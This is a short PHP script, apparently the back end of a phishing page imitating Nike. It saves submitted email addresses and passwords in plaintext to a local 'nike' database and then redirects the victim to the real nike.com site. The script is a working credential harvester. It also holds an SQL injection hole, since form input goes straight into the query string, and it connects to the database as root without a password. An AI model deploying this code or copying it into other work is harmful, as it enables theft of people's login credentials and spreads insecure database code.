<?php

$con = mysqli_connect('localhost','root');

if ($con) {
  echo " Connection successful ";
}else{
echo " No Connection ";
}

mysqli_select_db($con, 'nike' );

$mail = $_POST['mail'];
$pswd = $_POST['pswd'];

$query = " insert into login (mail, pswd)
values ('$mail', '$pswd') ";

echo "$query";

mysqli_query($con, $query);

header('location:https://www.nike.com/in/')

?>